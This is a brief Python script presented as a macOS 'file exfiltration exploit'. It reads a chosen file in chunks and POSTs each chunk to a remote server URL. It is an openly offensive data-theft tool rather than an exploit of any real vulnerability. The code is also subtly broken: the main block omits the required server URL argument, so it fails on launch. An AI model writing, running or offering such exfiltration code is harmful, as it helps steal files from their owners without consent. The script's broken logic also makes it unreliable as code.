import os
import requests
import logging

class MacOSFileExfiltrationExploit:
    def __init__(self, file_path, server_url):
        self.file_path = file_path
        self.server_url = server_url

    def exfiltrate_file(self):
        try:
            with open(self.file_path, 'rb') as file:
                chunk_number = 0
                while chunk := file.read(1024):  # Reading in 1 KB chunks
                    logging.info(f"Attempting to send chunk {chunk_number}")
                    response = requests.post(self.server_url, data=chunk)
                    if response.status_code == 200:
                        logging.info(f"Chunk {chunk_number} sent successfully")
                    else:
                        logging.error(f"Failed to send chunk {chunk_number}. Server response: {response.text}")
                    chunk_number += 1
        except FileNotFoundError:
            logging.error(f"File {self.file_path} not found.")
        except Exception as e:
            logging.error(f"An error occurred during exfiltration: {e}")

if __name__ == "__main__":
    file_path = input("Enter the path to the file to exfiltrate: ")
    logging.info(f"Exfiltrating {file_path}...")
    exploit = MacOSFileExfiltrationExploit(file_path)
    exploit.exfiltrate_file()
    logging.info("File exfiltration completed.")
